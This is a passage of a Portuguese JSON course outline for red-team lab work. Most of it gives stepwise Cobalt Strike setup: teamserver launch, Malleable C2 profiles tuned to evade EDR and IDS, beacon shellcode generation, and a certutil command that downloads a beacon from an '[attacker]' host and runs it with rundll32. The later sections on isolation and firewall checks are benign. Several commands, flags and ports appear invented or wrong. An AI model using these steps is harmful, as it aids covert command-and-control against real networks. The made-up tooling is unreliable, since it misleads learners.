                                    "Java 11+, arquivo JAR do Cobalt Strike baixado, terminal Linux/macOS, diretório de trabalho isolado"
                                  ],
                                  "tips": "Use uma VM isolada para evitar vazamentos; prefira senha gerada por pwgen ou similar.",
                                  "learningObjective": "Configurar pré-requisitos de ambiente para instalação segura do Cobalt Strike.",
                                  "commonMistakes": [
                                    "Java versão incompatível (use OpenJDK 11), extração em diretório sem permissões, senha fraca exposta em histórico"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Iniciar o Servidor Teamserver (C2)",
                                  "subSteps": [
                                    "Navegue para o diretório linux_x64: 'cd /opt/cobaltstrike/linux_x64'.",
                                    "Torne o teamserver executável: 'chmod +x teamserver'.",
                                    "Execute o servidor: './teamserver <IP_DO_SERVIDOR> <senha>' (ex: './teamserver 192.168.56.101 MinhaSenhaForte123').",
                                    "Monitore os logs iniciais para confirmação de inicialização sem erros (procure por 'Teamserver initialized').",
                                    "Configure firewall se necessário: 'sudo ufw allow from <IP_CLIENTE> to any port 50050' ou equivalente."
                                  ],
                                  "verification": "Logs mostram 'Ready to rumble' ou similar; netstat confirma porta 50050/UDP aberta.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Terminal com acesso root/sudo, IP estático do servidor, senha definida"
                                  ],
                                  "tips": "Use IP interno da VM (ifconfig/ip addr); rode em screen/tmux para persistência: 'screen -S cs-server'.",
                                  "learningObjective": "Dominar o comando de inicialização do C2 server e troubleshooting básico de rede.",
                                  "commonMistakes": [
                                    "IP incorreto (use IP da interface de rede correta), firewall bloqueando porta 50050, execução sem +x"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Conectar o Cliente e Configurar Listeners Iniciais",
                                  "subSteps": [
                                    "No cliente (máquina separada), execute: 'java -jar /caminho/para/cobaltstrike.jar'.",
                                    "Insira o IP do servidor e senha quando solicitado para conectar.",
                                    "Após conexão, vá para Listeners > New > HTTP/HTTPS: defina porta (ex: 80/443), Host (0.0.0.0).",
                                    "Salve e inicie o listener; verifique status 'Running'.",
                                    "Teste gerando um beacon de teste via Attacks > Packages."
                                  ],
                                  "verification": "Interface do Cobalt Strike carrega; listeners listados e ativos sem erros de conexão.",
                                  "estimatedTime": "20-25 minutos",
                                  "materials": [
                                    "Cliente com Java, caminho para cobaltstrike.jar, acesso de rede ao servidor"
                                  ],
                                  "tips": "Use HTTPS para produção; configure URIs personalizadas para evasão inicial.",
                                  "learningObjective": "Estabelecer comunicação cliente-servidor e setup de payloads básicos.",
                                  "commonMistakes": [
                                    "Senha/IP mismatch, Java heap insuficiente (-Xmx2g), listener em porta privilegiada sem root"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar e Estabilizar a Inicialização",
                                  "subSteps": [
                                    "No servidor, tail logs: 'tail -f teamserver.log' para erros recorrentes.",
                                    "No cliente, teste listener com 'View > Connections' após beacon simulado.",
                                    "Ajuste configurações Malleable C2 se necessário via Edit > Profiles.",
                                    "Backup chaves: copie .cobaltstrike dir para local seguro.",
                                    "Documente IPs, portas e senhas em arquivo criptografado."
                                  ],
                                  "verification": "Sem erros em logs; pelo menos um listener ativo e beacon conectável.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Editor de texto, ferramentas de log (tail, grep)"
                                  ],
                                  "tips": "Sempre teste em lab antes de prod; use killswitch para beacons.",
                                  "learningObjective": "Garantir estabilidade e operacionalidade do ambiente C2.",
                                  "commonMistakes": [
                                    "Ignorar logs de erros, não backupar keystores, expor portas publicamente"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com duas VMs Kali (servidor: 192.168.56.101, cliente: 192.168.56.102): extraia JAR em /opt/cs, rode './teamserver 192.168.56.101 SuperSenha123!', conecte cliente com 'java -jar cs.jar', crie listener HTTP na porta 8080, gere beacon e confirme conexão ativa.",
                              "finalVerifications": [
                                "Servidor teamserver inicializado sem erros nos logs.",
                                "Cliente conecta à interface gráfica sem falhas de autenticação.",
                                "Pelo menos um listener HTTP/HTTPS configurado e em status 'Running'.",
                                "Beacon de teste gera e conecta ao servidor.",
                                "Portas necessárias (50050/UDP, listener ports) abertas e acessíveis.",
                                "Backups de keystores e configs salvos."
                              ],
                              "assessmentCriteria": [
                                "Execução sem erros críticos em todos os steps.",
                                "Tempo total de setup inferior a 1 hora.",
                                "Logs limpos e verificações manuais passam 100%.",
                                "Configurações de listener seguras (HTTPS preferencial).",
                                "Documentação de IPs/senhas incluída.",
                                "Ambiente isolado e sem vazamentos detectados."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Configuração de IPs, portas TCP/UDP e firewalls (NF 03).",
                                "Sistemas Operacionais: Comandos Linux, permissões e processos (SO-02).",
                                "Programação: Scripts de automação para setup (PG-04).",
                                "Segurança de Software: Gerenciamento de senhas e chaves criptográficas (SS-01)."
                              ],
                              "realWorldApplication": "Em operações de Red Team reais, como exercícios de Purple Team, o setup de Cobalt Strike permite controle de beacons em redes alvo, simulação de APTs persistentes, evasão de detecção via listeners customizados e coordenação de ataques simulados em ambientes corporativos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.4.3.1"
                            ]
                          },
                          {
                            "id": "10.1.7.4.3.3",
                            "name": "Configurar beacons e malleable C2",
                            "description": "Criar perfil Malleable C2 (profiles/http-config), gerar beacon shellcode com cs beacon, testar infecção em target VM com sleep/checkin intervals ajustados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Criar o perfil Malleable C2 (http-config)",
                                  "subSteps": [
                                    "Abra um editor de texto como Notepad++ ou Vim.",
                                    "Crie um novo arquivo chamado 'profiles/http-config'.",
                                    "Defina as seções http-get, http-get-header, http-post e http-post-header com URIs e headers personalizados para evasão (ex: User-Agent rotativo, Host variado).",
                                    "Adicione transforms para ofuscação de dados (ex: printfs, base64).",
                                    "Salve o arquivo no diretório profiles/ do Cobalt Strike."
                                  ],
                                  "verification": "Valide a sintaxe abrindo o Cobalt Strike e carregando o perfil sem erros no console.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de texto",
                                    "Documentação Malleable C2 do Cobalt Strike",
                                    "Instalação do Cobalt Strike"
                                  ],
                                  "tips": "Use perfis de exemplo do repositório oficial como base para evitar erros de sintaxe.",
                                  "learningObjective": "Entender e personalizar tráfego C2 para mimetizar comunicações legítimas.",
                                  "commonMistakes": [
                                    "Sintaxe inválida em headers (ex: aspas faltando)",
                                    "Falta de stage blocks",
                                    "URIs não variados levando a detecção"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Carregar o perfil e iniciar o Team Server",
                                  "subSteps": [
                                    "Inicie o Cobalt Strike client e selecione 'C2 Profiles' > Load.",
                                    "Escolha o arquivo http-config criado e aplique ao listener padrão.",
                                    "No terminal, execute './teamserver [IP] [password] -C http-config' para iniciar o server.",
                                    "Confirme no client que o perfil está ativo (ícone verde no listener).",
                                    "Ajuste portas e certificados SSL se necessário para HTTPS."
                                  ],
                                  "verification": "Verifique logs do teamserver sem erros de perfil e listener ativo no client.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Cobalt Strike client e teamserver",
                                    "Máquina Linux/Windows para server"
                                  ],
                                  "tips": "Teste o perfil em modo verbose para debug: adicione 'set verbose true' no config.",
                                  "learningObjective": "Configurar infraestrutura C2 persistente com perfis customizados.",
                                  "commonMistakes": [
                                    "Portas bloqueadas por firewall",
                                    "Perfil não encontrado no path",
                                    "Mismatch de versão do Cobalt Strike"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerar Beacon shellcode com cs-beacon e configurar intervals",
                                  "subSteps": [
                                    "No diretório do Cobalt Strike, execute './cs-beacon [listener_host] [listener_port] [x86|x64]' para gerar shellcode.",
                                    "Salve o output como beacon.bin.",
                                    "Crie um listener no client: Attacks > Packages > Windows Beacon Shellcode > selecione malleable profile.",
                                    "Ajuste sleep (ex: 60s), jitter (30%), maxdns (false) e userwx (true) nas opções do listener.",
                                    "Gere payload final com stageless ou staged conforme necessidade."
                                  ],
                                  "verification": "Execute 'xxd beacon.bin' para inspecionar shellcode não-zero e valide no Wireshark tráfego malleable.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "cs-beacon binary",
                                    "Wireshark para inspeção",
                                    "Listener configurado"
                                  ],
                                  "tips": "Use jitter alto para evasão; teste sleep baixo apenas em labs para responsividade.",
                                  "learningObjective": "Gerar payloads customizados com parâmetros otimizados para stealth.",
                                  "commonMistakes": [
                                    "Arquitetura errada (x86 vs x64)",
                                    "Sleep muito baixo causando detecção por EDR",
                                    "Falta de profile no listener"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar infecção e comunicação em target VM",
                                  "subSteps": [
                                    "Prepare VM Windows isolada (ex: Windows 10 sem AV ou com EDR desabilitado para lab).",
                                    "Injete beacon.bin via rundll32 ou certutil (ex: certutil -urlfetch -f http://[attacker]/beacon.bin beacon.bin; rundll32 beacon.bin,#1).",
                                    "Monitore checkins no Cobalt Strike client (sleep/checkin conforme configurado).",
                                    "Execute comandos básicos: shell, ps, upload para validar controle.",
                                    "Capture tráfego no Wireshark para confirmar malleable profile (sem strings Cobalt Strike).",
                                    "Cleanup: mate beacon e delete artifacts."
                                  ],
                                  "verification": "Beacon aparece online no client, responde a comandos e tráfego não é detectável por YARA básica.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "VM target (VirtualBox/VMware)",
                                    "Wireshark",
                                    "Ferramentas de injeção (certutil, powershell)"
                                  ],
                                  "tips": "Use VM snapshot para reset rápido; grave sessão para análise pós-teste.",
                                  "learningObjective": "Validar end-to-end operação de Beacon em ambiente controlado.",
                                  "commonMistakes": [
                                    "Falha na injeção por AMSI/Defender",
                                    "Network isolation esquecida",
                                    "Sleep não respeitado causando flood"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team, crie um perfil Malleable que imita tráfego do Google Analytics (URI /__utm.gif, headers X-Requested-With). Gere beacon x64 para Windows Server 2019 VM, injete via phishing simulado, ajuste sleep=300s jitter=40%, e confirme C2 via HTTPS sem alertas em Suricata.",
                              "finalVerifications": [
                                "Perfil Malleable carrega sem erros e altera tráfego visível no Wireshark.",
                                "Beacon shellcode gera e injeta com sucesso, checkin no intervalo configurado.",
                                "Comandos remotos executam sem crashes (shell, keylogger, screenshot).",
                                "Tráfego resiste a regras básicas de IDS/IPS (ex: Snort community rules).",
                                "Cleanup completo sem persistência indesejada na VM.",
                                "Documentação do perfil e testes salva em relatório."
                              ],
                              "assessmentCriteria": [
                                "Precisão na edição do perfil Malleable (sem erros de sintaxe, evasão efetiva).",
                                "Configuração correta de sleep/jitter/checkin (stealth vs usabilidade balanceada).",
                                "Sucesso na geração e implantação do Beacon (100% checkin em 3 tentativas).",
                                "Análise de tráfego confirma mimetismo (score >80% em ferramentas como C2 Matrix).",
                                "Relatório inclui screenshots de Wireshark, logs e lições aprendidas.",
                                "Tempo total dentro de 2 horas com zero violações de OPSEC lab."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Análise de protocolos HTTP/HTTPS e ofuscação de pacotes.",
                                "Programação: Edição de configs em C-like syntax e shellcode handling.",
                                "Sistemas Operacionais: Injeção de payloads em Windows e gerenciamento de processos.",
                                "Ética e Direito: Discussão de regras de engajamento em Red Team ops.",
                                "Análise de Malware: Comparação com C2 reais como Cobalt Strike em APTs."
                              ],
                              "realWorldApplication": "Em operações de Red Team autorizadas (ex: pentests para Fortune 500), configura beacons Malleable para simular APTs persistentes, evadindo SIEM/EDR como Splunk ou CrowdStrike, permitindo mapeamento de redes internas sem detecção precoce."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.4.3.2"
                            ]
                          },
                          {
                            "id": "10.1.7.4.3.4",
                            "name": "Validar integração com ambiente Red Team",
                            "description": "Integrar com Nmap/Metasploit para pivoting, simular ROE com kill dates em beacons, monitorar logs e artifacts para detecção Blue Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Verificar e Configurar Integração com Nmap",
                                  "subSteps": [
                                    "Inicie o Cobalt Strike e acesse o menu de listeners.",
                                    "Configure um listener HTTP/HTTPS compatível com Nmap output.",
                                    "Execute um scan Nmap em alvos de teste e importe resultados via Aggressor Script.",
                                    "Teste o parsing de XML/Normal output do Nmap no Cobalt Strike.",
                                    "Valide que hosts descobertos aparecem no console do Cobalt Strike."
                                  ],
                                  "verification": "Hosts do Nmap scan aparecem listados no Cobalt Strike com portas e serviços corretos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Cobalt Strike instalado, Nmap, VM de alvo de teste, Aggressor Script para importação.",
                                  "tips": "Use o formato XML do Nmap para melhor compatibilidade com scripts de importação.",
                                  "learningObjective": "Entender como Nmap feeds dados para Cobalt Strike para reconnaissance inicial.",
                                  "commonMistakes": "Ignorar firewalls que bloqueiam scans; não especificar output XML."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Integrar com Metasploit para Pivoting",
                                  "subSteps": [
                                    "Instale o plugin Mettle ou beacon-injector no Metasploit.",
                                    "Configure um listener Cobalt Strike e gere payload para injeção via msfvenom.",
                                    "Inicie sessão Metasploit, migre para beacon Cobalt Strike via post/exploit module.",
                                    "Estabeleça pivô através do beacon para scans internos via autoroute.",
                                    "Teste comandos de pivoting como 'sockshost' ou 'ssh' do Cobalt Strike."
                                  ],
                                  "verification": "Comandos executados via pivô Metasploit chegam ao beacon e retornam dados da rede interna.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Metasploit Framework, Cobalt Strike, payloads gerados, rede lab com pivô possível.",
                                  "tips": "Sempre teste migração em ambiente isolado para evitar crashes de sessão.",
                                  "learningObjective": "Dominar pivoting entre ferramentas para expansão lateral em simulações.",
                                  "commonMistakes": "Falhar na migração de shell devido a ASLR/DEP; portas erradas no listener."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Beacons com ROE e Kill Dates",
                                  "subSteps": [
                                    "Crie um team server com malleable C2 profiles.",
                                    "Gere beacons com sleep mask e jitter configurados.",
                                    "Defina Rules of Engagement (ROE) via tasks: killdate, maxdns, uselocker.",
                                    "Programe beacons para auto-destruição após kill date simulada.",
                                    "Teste check-in inicial e tarefas condicionais baseadas em ROE."
                                  ],
                                  "verification": "Beacon respeita kill date (self-destructs) e não excede limites de DNS ou jitter.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Cobalt Strike team server, malleable profiles, beacons gerados.",
                                  "tips": "Use jitter alto (30-60%) para evadir detecção inicial em simulações.",
                                  "learningObjective": "Implementar controles éticos e temporais em operações Red Team.",
                                  "commonMistakes": "Esquecer de sincronizar kill dates com fuso horário do alvo."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Monitorar Logs e Artifacts para Detecção Blue Team",
                                  "subSteps": [
                                    "Ative logging detalhado no Cobalt Strike (event logs, Malleable parser).",
                                    "Execute operações: beacon check-in, lateral movement, exfil simulado.",
                                    "Colete artifacts: network traffic (Wireshark), host logs (Event Viewer/Syslog).",
                                    "Analise IOCs: user-agents custom, jitter patterns, beacon callbacks.",
                                    "Simule detecção Blue Team revisando logs para alertas de SIEM."
                                  ],
                                  "verification": "Logs mostram IOCs gerados corretamente e são identificáveis em ferramentas Blue Team.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Wireshark, SIEM simulado (Splunk/ELK), hosts Windows/Linux com logging ativado.",
                                  "tips": "Correlacione timestamps de beacons com logs de firewall para detecção precisa.",
                                  "learningObjective": "Identificar e mitigar footprints de Red Team para stealth operations.",
                                  "commonMistakes": "Não mascarar user-agents levando a detecção imediata por IDS."
                                }
                              ],
                              "practicalExample": "Em um lab com Active Directory simulado, use Nmap para mapear a rede externa, pivote via Metasploit para um host comprometido, deploy beacons com kill date de 48h, execute DCSync simulado e monitore Wireshark para tráfego C2 detectável pelo Blue Team.",
                              "finalVerifications": [
                                "Nmap hosts importados corretamente no Cobalt Strike.",
                                "Pivoting Metasploit-Cobalt Strike estabelecido com comandos funcionais.",
                                "Beacons respeitam ROE e self-destruct em kill date.",
                                "Logs e artifacts gerados são analisáveis e simulam detecção real.",
                                "Nenhuma violação de ROE durante a simulação.",
                                "Integração end-to-end sem erros de conectividade."
                              ],
                              "assessmentCriteria": [
                                "Configurações de integração 100% funcionais (40%)",
                                "Simulação de ROE e kill dates precisa (25%)",
                                "Monitoramento de logs abrangente com IOCs identificados (20%)",
                                "Execução sem erros comuns ou crashes (10%)",
                                "Documentação de verificações finais completa (5%)"
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entendimento de pivoting e roteamento (CCNA/Nmap).",
                                "Programação: Aggressor Scripts para automação (Python/Ruby).",
                                "Análise Forense: Coleta e análise de logs (SIEM tools).",
                                "Ética: Aplicação de ROE em operações cibernéticas."
                              ],
                              "realWorldApplication": "Durante Red Team engagements reais, validar integrações garante operações stealthy, respeitando ROE para evitar detecção prematura e conformidade legal, como em assessments para bancos ou governos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.4.3.3"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.7.5",
                    "name": "Validação e Testes do Ambiente Laboratorial",
                    "description": "Verificação de isolamento, conectividade e funcionalidade para exercícios de guerra cibernética.",
                    "individualConcepts": [
                      {
                        "id": "10.1.7.5.1",
                        "name": "Verificação de Isolamento",
                        "description": "Processo de confirmação de que o ambiente laboratorial está completamente isolado de redes externas e internas para prevenir vazamentos durante exercícios de guerra cibernética.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.5.1.1",
                            "name": "Testar isolamento de rede externa",
                            "description": "Executar comandos como ping e traceroute para hosts externos (ex: 8.8.8.8, google.com) a partir de máquinas do lab para garantir ausência de conectividade com a internet.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar e Acessar as Máquinas do Laboratório",
                                  "subSteps": [
                                    "Identifique as máquinas virtuais ou físicas designadas para o laboratório de jogos cibernéticos (ex: VMs Kali Linux, Windows targets).",
                                    "Acesse as máquinas via console local, SSH ou RDP, utilizando credenciais pré-configuradas para o ambiente isolado.",
                                    "Execute o comando 'ip addr show' ou 'ifconfig' para confirmar o endereço IP local e interface de rede ativa.",
                                    "Verifique se não há proxies ou VPNs configurados que possam mascarar o isolamento (desative se necessário).",
                                    "Anote o hostname e IP da máquina para documentação posterior."
                                  ],
                                  "verification": "Acesso bem-sucedido à máquina com prompt de terminal ativo e IP local confirmado sem conectividade aparente.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Cliente SSH/RDP (ex: PuTTY, OpenSSH)",
                                    "Credenciais de acesso ao lab",
                                    "Lista de máquinas do ambiente"
                                  ],
                                  "tips": [
                                    "Use 'screen' ou 'tmux' para sessões persistentes em caso de desconexão.",
                                    "Teste acesso de múltiplas máquinas para cobertura completa."
                                  ],
                                  "learningObjective": "Garantir acesso seguro e controle inicial das máquinas no ambiente isolado.",
                                  "commonMistakes": [
                                    "Usar credenciais erradas levando a lockout.",
                                    "Acessar via rede externa acidentalmente.",
                                    "Ignorar verificação de IP local."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar Testes de Ping para Hosts Externos",
                                  "subSteps": [
                                    "Selecione hosts externos conhecidos como 8.8.8.8 (DNS Google), 1.1.1.1 (Cloudflare) e google.com.",
                                    "No terminal, execute 'ping -c 4 8.8.8.8' (limite a 4 pacotes para eficiência).",
                                    "Registre o output: procure por '100% packet loss' ou 'Request timeout'.",
                                    "Repita para pelo menos 3 hosts diferentes, incluindo domínios (resolução DNS deve falhar ou timeout).",
                                    "Teste de uma segunda máquina no lab para consistência."
                                  ],
                                  "verification": "Todos os pings resultam em falha total (sem respostas recebidas), confirmando ausência de conectividade.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal Linux/Windows",
                                    "Lista de hosts externos: 8.8.8.8, 1.1.1.1, google.com"
                                  ],
                                  "tips": [
                                    "Use '-c 4' para evitar loops infinitos.",
                                    "Combine com 'ping -I <interface>' se múltiplas interfaces."
                                  ],
                                  "learningObjective": "Dominar o uso do comando ping para diagnosticar conectividade de rede externa.",
                                  "commonMistakes": [
                                    "Interpretar 'unreachable' como isolamento (pode ser firewall local).",
                                    "Testar apenas um host.",
                                    "Executar ping infinito sem limite."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Testes de Traceroute para Hosts Externos",
                                  "subSteps": [
                                    "Instale traceroute se necessário ('apt install traceroute' no Debian-based).",
                                    "Execute 'traceroute 8.8.8.8' ou 'traceroute -m 10 8.8.8.8' (limite hops).",
                                    "Analise o output: deve parar no primeiro hop (roteador local) com timeouts subsequentes.",
                                    "Repita para google.com e outro host, observando falhas em resolução DNS ou hops iniciais.",
                                    "Compare resultados entre máquinas do lab."
                                  ],
                                  "verification": "Traceroute falha após o primeiro hop ou não inicia, sem rotas para hosts externos.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Comando traceroute instalado",
                                    "Hosts externos da lista anterior"
                                  ],
                                  "tips": [
                                    "Use 'traceroute -T' para TCP se ICMP bloqueado.",
                                    "Salve output com 'traceroute 8.8.8.8 | tee trace.log'."
                                  ],
                                  "learningObjective": "Utilizar traceroute para mapear caminhos de rede e confirmar bloqueio de saída.",
                                  "commonMistakes": [
                                    "Confundir timeout inicial com sucesso.",
                                    "Não instalar traceroute antes.",
                                    "Ignorar diferenças entre traceroute IPv4/IPv6."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Documentar Resultados e Confirmar Isolamento",
                                  "subSteps": [
                                    "Compile screenshots ou logs de todos os comandos executados (ping e traceroute).",
                                    "Crie um relatório simples listando hosts testados, comandos usados e resultados (ex: 'Falha confirmada').",
                                    "Execute teste adicional: 'curl -I google.com' ou 'nslookup google.com' para validação extra.",
                                    "Compartilhe resultados com a equipe via canal interno do lab (não externo).",
                                    "Se falha no isolamento detectada, relate para configuração de firewall/roteador."
                                  ],
                                  "verification": "Relatório completo gerado com evidências de falha em todos testes, sem exceções.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Editor de texto ou ferramenta de screenshot (ex: scrot, Snipping Tool)",
                                    "Template de relatório"
                                  ],
                                  "tips": [
                                    "Use scripts para automação futura: 'for host in ...; do ping -c1 $host; done'.",
                                    "Armazene em pasta compartilhada do lab."
                                  ],
                                  "learningObjective": "Documentar testes de forma profissional para auditoria e reprodutibilidade.",
                                  "commonMistakes": [
                                    "Não capturar outputs.",
                                    "Omitir testes extras como DNS.",
                                    "Enviar relatório via email externo."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório de Red Team com VMs Kali Linux isoladas, acesse via SSH uma VM target, execute 'ping -c 4 8.8.8.8' resultando em '100% packet loss', seguido de 'traceroute google.com' parando no hop 1 com asteriscos (* * *), confirmando isolamento total e pronto para simulação de ataque sem vazamento.",
                              "finalVerifications": [
                                "Ping para 8.8.8.8, 1.1.1.1 e google.com falha em todas as máquinas do lab.",
                                "Traceroute não alcança hosts externos além do roteador local.",
                                "Resolução DNS falha para domínios externos (ex: nslookup google.com timeout).",
                                "Nenhum tráfego de saída detectado via tcpdump em interface WAN.",
                                "Relatório documentado com logs e screenshots arquivados.",
                                "Testes repetidos em intervalos de 5 minutos confirmam consistência."
                              ],
                              "assessmentCriteria": [
                                "Execução correta e completa de ping e traceroute sem erros de sintaxe.",
                                "Interpretação precisa dos outputs como evidência de isolamento.",
                                "Cobertura de múltiplos hosts e máquinas no lab.",
                                "Documentação clara e organizada com evidências visuais.",
                                "Identificação e reporte de qualquer falha no isolamento.",
                                "Eficiência no tempo: conclusão em menos de 60 minutos."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Compreensão de ICMP, TTL e roteamento.",
                                "Segurança Cibernética: Firewall rules e air-gapping em labs.",
                                "Sistemas Operacionais: Comandos Linux/Windows de rede.",
                                "Análise Forense: Logging e captura de tráfego (tcpdump/wireshark).",
                                "Gerenciamento de Projetos: Documentação de testes em cenários de TI."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou CTFs reais, como simulações de ataque em empresas, testar isolamento de rede externa previne vazamento acidental de dados sensíveis para a internet, garantindo conformidade com regulamentações como GDPR e evitando detecção precoce por sistemas de monitoramento externos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.5.1.2",
                            "name": "Verificar regras de firewall e NAT",
                            "description": "Analisar configurações de firewalls (iptables, pfSense) e NAT para bloquear todo tráfego inbound/outbound não autorizado, usando ferramentas como nmap e tcpdump.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Acessar e revisar configurações de firewall",
                                  "subSteps": [
                                    "Conecte-se ao host do laboratório via SSH ou console.",
                                    "Execute comandos para listar regras atuais: 'iptables -L -n -v' para iptables ou acesse a interface web do pfSense.",
                                    "Documente todas as regras de INPUT, OUTPUT e FORWARD chains.",
                                    "Identifique políticas padrão (DROP ou ACCEPT) e regras existentes para tráfego inbound/outbound.",
                                    "Salve a saída em um arquivo de log para análise posterior."
                                  ],
                                  "verification": "Confirme que todas as chains foram listadas e documentadas sem erros de permissão.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso SSH/console ao host lab",
                                    "Editor de texto (vim/nano)",
                                    "Ferramenta de log (ex: script.sh)"
                                  ],
                                  "tips": "Use 'iptables-save > firewall_rules.txt' para exportar regras completas de forma rápida.",
                                  "learningObjective": "Entender a estrutura e o estado atual das regras de firewall para identificar gaps de segurança.",
                                  "commonMistakes": [
                                    "Executar sem privilégios root/sudo, resultando em 'permission denied';",
                                    "Ignorar chains personalizadas ou nat/ mangle tables;"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar e validar regras de NAT",
                                  "subSteps": [
                                    "Liste regras de NAT: 'iptables -t nat -L -n -v' ou verifique seção NAT no pfSense GUI.",
                                    "Verifique masquerading, port forwarding e DNAT/SNAT para tráfego não autorizado.",
                                    "Confirme que não há regras permitindo tráfego inbound indesejado (ex: portas expostas).",
                                    "Teste regras NAT com 'iptables -t nat -S' para regras em formato legível.",
                                    "Ajuste temporariamente uma regra para teste e reverta após validação."
                                  ],
                                  "verification": "Regra de NAT listada mostra apenas tráfego outbound autorizado, sem exposições inbound.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Acesso root ao host",
                                    "Documentação de regras iptables/pfSense"
                                  ],
                                  "tips": "No pfSense, use Firewall > NAT para visualização gráfica; filtre por interface WAN/LAN.",
                                  "learningObjective": "Dominar inspeção de NAT para garantir isolamento de rede no ambiente lab.",
                                  "commonMistakes": [
                                    "Confundir tables filter e nat;",
                                    "Não verificar POSTROUTING para masquerade leaks;"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Testar isolamento com nmap",
                                  "subSteps": [
                                    "Instale nmap se necessário: 'apt install nmap' ou equivalente.",
                                    "Execute scan SYN stealth: 'nmap -sS -p- <IP_lab> -oN scan_results.txt' de uma máquina externa.",
                                    "Scan UDP: 'nmap -sU --top-ports 100 <IP_lab>'.",
                                    "Verifique portas abertas/filtered/closed e compare com regras esperadas.",
                                    "Repita scan após qualquer ajuste de regras para confirmação."
                                  ],
                                  "verification": "Relatório nmap mostra todas portas como filtered/closed exceto autorizadas explicitamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Máquina atacante externa no mesmo segmento ou via VPN",
                                    "Nmap instalado"
                                  ],
                                  "tips": "Use '-T4' para scans mais rápidos; salve outputs com -oA para múltiplos formatos.",
                                  "learningObjective": "Aplicar nmap para validar efetividade de bloqueios de firewall.",
                                  "commonMistakes": [
                                    "Scan da própria máquina lab (loopback ignora regras);",
                                    "Não especificar range de portas completo (-p-);"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Monitorar tráfego com tcpdump e finalizar validação",
                                  "subSteps": [
                                    "Inicie captura: 'tcpdump -i <interface> -w capture.pcap -s0' em background.",
                                    "Gere tráfego de teste: ping, telnet ou curl para portas não autorizadas de máquina externa.",
                                    "Pare captura (Ctrl+C) e analise: 'tcpdump -r capture.pcap' ou Wireshark.",
                                    "Confirme ausência de pacotes inbound/outbound não autorizados.",
                                    "Gere relatório final resumindo achados e recomendações."
                                  ],
                                  "verification": "pcap mostra drops de pacotes não autorizados, sem passagem de tráfego indesejado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "tcpdump instalado",
                                    "Wireshark opcional para análise GUI",
                                    "Máquina geradora de tráfego"
                                  ],
                                  "tips": "Filtre tcpdump com 'port 80 or port 443' para foco; use -vv para verbose drops.",
                                  "learningObjective": "Usar tcpdump para evidenciar bloqueios reais de tráfego em tempo real.",
                                  "commonMistakes": [
                                    "Capturar em interface errada (ex: lo em vez de eth0);",
                                    "Não gerar tráfego de teste realista;"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com VM Ubuntu (iptables) e pfSense como gateway, revise regras para bloquear tudo exceto SSH outbound. Use Kali Linux externa para nmap -sS 192.168.1.100, confirmando filtered ports, e tcpdump para ver ICMP drops em tentativas de ping.",
                              "finalVerifications": [
                                "Todas portas inbound/outbound não autorizadas aparecem filtered/closed no nmap.",
                                "tcpdump mostra zero pacotes permitidos além do baseline autorizado.",
